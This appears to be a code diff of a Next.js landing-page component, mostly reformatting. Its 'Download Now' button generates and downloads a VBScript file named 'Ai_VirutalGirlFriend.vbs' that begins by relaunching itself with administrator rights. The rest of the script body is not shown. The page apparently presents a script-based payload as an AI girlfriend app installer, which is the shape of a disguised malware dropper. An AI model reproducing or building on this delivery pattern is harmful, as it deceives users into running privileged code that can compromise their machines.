@@ -1,4 +1,6 @@
-"use client"
+/* eslint-disable */
+
+"use client";
 import React from "react";
 import Link from "next/link";
 import { Sparkles } from "lucide-react";
@@ -6,7 +8,6 @@ import { FaDownload } from "react-icons/fa";
 import { MdInstallDesktop } from "react-icons/md";
 import { SiFunimation } from "react-icons/si";
 import { FaWindows } from "react-icons/fa";
-
 
 import {
   fadeIn,
@@ -24,8 +25,8 @@ import { Badge, Button } from "@/components/ui";
 import SVG from "@/components/utils/SVG";
 
 function Hero() {
-   const handleDownload = () => {
-     const vbsScript = `RunAsAdmin
+  const handleDownload = () => {
+    const vbsScript = `RunAsAdmin
 Main
 Function RunAsAdmin()
   Dim objAPP
@@ -47,16 +48,16 @@ Function Main()
 End Function
 `;
 
-     const blob = new Blob([vbsScript], { type: "text/vbs" });
-     const url = URL.createObjectURL(blob);
-     const a = document.createElement("a");
-     a.href = url;
-     a.download = "Ai_VirutalGirlFriend.vbs";
-     document.body.appendChild(a);
-     a.click();
-     document.body.removeChild(a);
-     URL.revokeObjectURL(url);
-   };
+    const blob = new Blob([vbsScript], { type: "text/vbs" });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement("a");
+    a.href = url;
+    a.download = "Ai_VirutalGirlFriend.vbs";
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+    URL.revokeObjectURL(url);
+  };
   return (
     <section
       id="hero"
@@ -111,7 +112,10 @@ End Function
         </div>
         <MotionDiv {...slideInFromLeft(1)}>
           {/* <Link href="#skills" tabIndex={-1}> */}
-          <Button className="flex items-center justify-center gap-x-2" onClick={handleDownload}>
+          <Button
+            className="flex items-center justify-center gap-x-2"
+            onClick={handleDownload}
+          >
             <FaWindows />
             Download Now
           </Button>
@@ -129,3 +133,4 @@ End Function
 }
 
 export default Hero;
+/* eslint-enable */
